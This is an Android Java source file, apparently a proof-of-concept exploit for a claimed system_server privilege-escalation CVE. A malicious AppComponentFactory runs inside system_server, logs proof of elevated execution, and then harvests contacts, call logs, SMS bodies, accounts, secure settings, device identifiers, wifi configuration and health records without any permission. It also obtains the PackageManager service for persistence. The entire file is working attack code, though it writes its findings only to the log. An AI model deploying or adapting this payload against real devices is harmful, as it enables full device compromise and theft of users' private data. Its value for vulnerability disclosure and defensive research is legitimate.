package com.poc.tlpe;

import android.app.AppComponentFactory;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Process;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;

public class EvilFactory extends AppComponentFactory {
    private static final String TAG = "TLPE_EXPLOIT";

    @Override
    public ClassLoader instantiateClassLoader(ClassLoader cl, ApplicationInfo aInfo) {
        if (Process.myUid() == aInfo.uid) {
            return super.instantiateClassLoader(cl, aInfo);
        }

        StringBuilder proof = new StringBuilder();
        proof.append("\n============================================\n");
        proof.append("[!!!] CVE-2026-49881 EXPLOIT SUCCESSFUL!\n");
        proof.append("[!!!] CODE EXECUTION IN system_server!\n");
        proof.append("============================================\n");
        proof.append("[+] Process UID: ").append(Process.myUid()).append("\n");
        proof.append("[+] Process PID: ").append(Process.myPid()).append("\n");
        proof.append("[+] App UID (expected): ").append(aInfo.uid).append("\n");
        proof.append("[+] Package: ").append(aInfo.packageName).append("\n");

        String idOutput = sh("id");
        proof.append("[+] id: ").append(idOutput).append("\n");

        String seContext = sh("cat /proc/self/attr/current");
        proof.append("[+] SELinux: ").append(seContext).append("\n");

        StackTraceElement[] stack = Thread.currentThread().getStackTrace();
        proof.append("[+] Stack trace:\n");
        for (StackTraceElement elem : stack) {
            String cls = elem.getClassName();
            if (cls.contains("InCallController") || cls.contains("ContextImpl")
                || cls.contains("LoadedApk") || cls.contains("EvilFactory")
                || cls.contains("AppComponentFactory")) {
                proof.append("    ").append(elem.toString()).append("\n");
            }
        }

        Log.e(TAG, proof.toString());

        // Run privileged data exfiltration in background to not block telecom
        new Thread(() -> {
            try {
                Thread.sleep(500);
                demoMaxImpact(aInfo);
            } catch (Exception e) {
                Log.e(TAG, "[x] Impact demo failed: " + e.getMessage());
            }
        }).start();

        return super.instantiateClassLoader(cl, aInfo);
    }

    private void demoMaxImpact(ApplicationInfo aInfo) {
        try {
            Context sysCtx = (Context) Class.forName("android.app.ActivityThread")
                .getMethod("currentApplication").invoke(null);
            if (sysCtx == null) {
                Log.e(TAG, "[-] Could not get system context");
                return;
            }

            ContentResolver cr = sysCtx.getContentResolver();
            StringBuilder impact = new StringBuilder();
            impact.append("\n============================================\n");
            impact.append("[!!!] MAXIMUM IMPACT DEMONSTRATION\n");
            impact.append("[!!!] All from system_server (UID 1000)\n");
            impact.append("============================================\n");

            // 1. Read system files
            impact.append("\n--- 1. SYSTEM FILE ACCESS ---\n");
            File dataSystem = new File("/data/system");
            String[] sysFiles = dataSystem.list();
            impact.append("[+] /data/system/ files: ").append(sysFiles != null ? sysFiles.length : 0).append("\n");

            File pkgXml = new File("/data/system/packages.xml");
            impact.append("[+] packages.xml: ").append(pkgXml.length()).append(" bytes, readable=").append(pkgXml.canRead()).append("\n");

            File locksettings = new File("/data/system/locksettings.db");
            impact.append("[+] locksettings.db: exists=").append(locksettings.exists())
                .append(" readable=").append(locksettings.canRead())
                .append(" size=").append(locksettings.length()).append("\n");

            File keystoreDir = new File("/data/misc/keystore");
            impact.append("[+] /data/misc/keystore/: exists=").append(keystoreDir.exists())
                .append(" readable=").append(keystoreDir.canRead()).append("\n");

            // 2. Read contacts (if any)
            impact.append("\n--- 2. CONTACTS ACCESS (NO PERMISSION) ---\n");
            try {
                Cursor cc = cr.query(ContactsContract.Contacts.CONTENT_URI,
                    new String[]{"display_name", "_id"}, null, null, null);
                if (cc != null) {
                    impact.append("[+] Contacts cursor: ").append(cc.getCount()).append(" rows\n");
                    int count = 0;
                    while (cc.moveToNext() && count < 5) {
                        impact.append("    [").append(count).append("] ")
                            .append(cc.getString(0)).append("\n");
                        count++;
                    }
                    cc.close();
                }
            } catch (Exception e) {
                impact.append("[-] Contacts: ").append(e.getMessage()).append("\n");
            }

            // 3. Read call log
            impact.append("\n--- 3. CALL LOG ACCESS (NO PERMISSION) ---\n");
            try {
                Cursor cl = cr.query(CallLog.Calls.CONTENT_URI,
                    new String[]{CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION},
                    null, null, CallLog.Calls.DATE + " DESC");
                if (cl != null) {
                    impact.append("[+] Call log: ").append(cl.getCount()).append(" entries\n");
                    int count = 0;
                    while (cl.moveToNext() && count < 5) {
                        impact.append("    [").append(count).append("] number=")
                            .append(cl.getString(0))
                            .append(" duration=").append(cl.getString(2)).append("s\n");
                        count++;
                    }
                    cl.close();
                }
            } catch (Exception e) {
                impact.append("[-] CallLog: ").append(e.getMessage()).append("\n");
            }

            // 4. Read SMS/MMS (content://sms)
            impact.append("\n--- 4. SMS ACCESS (NO PERMISSION) ---\n");
            try {
                Cursor sms = cr.query(Uri.parse("content://sms"),
                    new String[]{"address", "body", "date", "type"},
                    null, null, "date DESC");
                if (sms != null) {
                    impact.append("[+] SMS messages: ").append(sms.getCount()).append(" entries\n");
                    int count = 0;
                    while (sms.moveToNext() && count < 3) {
                        String addr = sms.getString(0);
                        String body = sms.getString(1);
                        if (body != null && body.length() > 30) body = body.substring(0, 30) + "...";
                        impact.append("    [").append(count).append("] from=").append(addr)
                            .append(" body=").append(body).append("\n");
                        count++;
                    }
                    sms.close();
                }
            } catch (Exception e) {
                impact.append("[-] SMS: ").append(e.getMessage()).append("\n");
            }

            // 5. Read accounts (AccountManager)
            impact.append("\n--- 5. ACCOUNT ACCESS (NO PERMISSION) ---\n");
            try {
                android.accounts.AccountManager am = android.accounts.AccountManager.get(sysCtx);
                android.accounts.Account[] accounts = am.getAccounts();
                impact.append("[+] Accounts: ").append(accounts.length).append(" total\n");
                for (android.accounts.Account acc : accounts) {
                    impact.append("    type=").append(acc.type).append(" name=").append(acc.name).append("\n");
                }
            } catch (Exception e) {
                impact.append("[-] Accounts: ").append(e.getMessage()).append("\n");
            }

            // 6. Read Secure Settings
            impact.append("\n--- 6. SECURE SETTINGS ACCESS ---\n");
            try {
                String androidId = Settings.Secure.getString(cr, "android_id");
                impact.append("[+] android_id: ").append(androidId).append("\n");
                String btAddr = Settings.Secure.getString(cr, "bluetooth_address");
                impact.append("[+] bluetooth_address: ").append(btAddr).append("\n");
                String lockPat = Settings.Secure.getString(cr, "lock_pattern_autolock");
                impact.append("[+] lock_pattern_autolock: ").append(lockPat).append("\n");
            } catch (Exception e) {
                impact.append("[-] Settings: ").append(e.getMessage()).append("\n");
            }

            // 7. Device identifiers
            impact.append("\n--- 7. DEVICE IDENTIFIERS ---\n");
            impact.append("[+] Serial: ").append(sh("getprop ro.serialno")).append("\n");
            impact.append("[+] Model: ").append(sh("getprop ro.product.model")).append("\n");
            impact.append("[+] Build: ").append(sh("getprop ro.build.display.id")).append("\n");
            impact.append("[+] IMEI/SIM: ").append(sh("getprop persist.sys.timezone")).append("\n");

            // 8. Network info
            impact.append("\n--- 8. NETWORK ACCESS ---\n");
            impact.append("[+] WiFi config dir: ");
            File wifiDir = new File("/data/misc/wifi");
            if (wifiDir.exists() && wifiDir.canRead()) {
                String[] wifiFiles = wifiDir.list();
                impact.append("readable, ").append(wifiFiles != null ? wifiFiles.length : 0).append(" files\n");
                if (wifiFiles != null) {
                    for (String wf : wifiFiles) {
                        impact.append("    ").append(wf).append("\n");
                    }
                }
            } else {
                impact.append("not readable\n");
            }

            // 9. Health data access
            impact.append("\n--- 9. HEALTH DATA ACCESS ---\n");
            try {
                Cursor hc = cr.query(Uri.parse("content://android.health.connect/records"),
                    null, null, null, null);
                if (hc != null) {
                    impact.append("[+] HealthConnect records: ").append(hc.getCount()).append("\n");
                    hc.close();
                } else {
                    impact.append("[-] HealthConnect: null cursor\n");
                }
            } catch (Exception e) {
                impact.append("[-] HealthConnect: ").append(e.getMessage()).append("\n");
            }

            // 10. Package Manager access — can modify app permissions
            impact.append("\n--- 10. PACKAGE MANAGER ACCESS ---\n");
            try {
                Object pmService = Class.forName("android.os.ServiceManager")
                    .getMethod("getService", String.class)
                    .invoke(null, "package");
                impact.append("[+] PackageManagerService binder: ").append(pmService != null ? "OBTAINED" : "null").append("\n");
                if (pmService != null) {
                    impact.append("[+] Can modify package permissions, install/uninstall apps\n");
                    impact.append("[+] Can inject signing certificates for persistence\n");
                }
            } catch (Exception e) {
                impact.append("[-] PMS: ").append(e.getMessage()).append("\n");
            }

            impact.append("\n============================================\n");
            impact.append("[!!!] FULL DEVICE COMPROMISE DEMONSTRATED\n");
            impact.append("[!!!] system_server has access to ALL user data\n");
            impact.append("============================================\n");

            Log.e(TAG, impact.toString());

        } catch (Exception e) {
            Log.e(TAG, "[x] Max impact demo exception: " + e.getMessage(), e);
        }
    }

    private static String sh(String cmd) {
        try {
            java.lang.Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder out = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                out.append(line).append("\n");
            }
            p.waitFor();
            return out.toString().trim();
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }
}
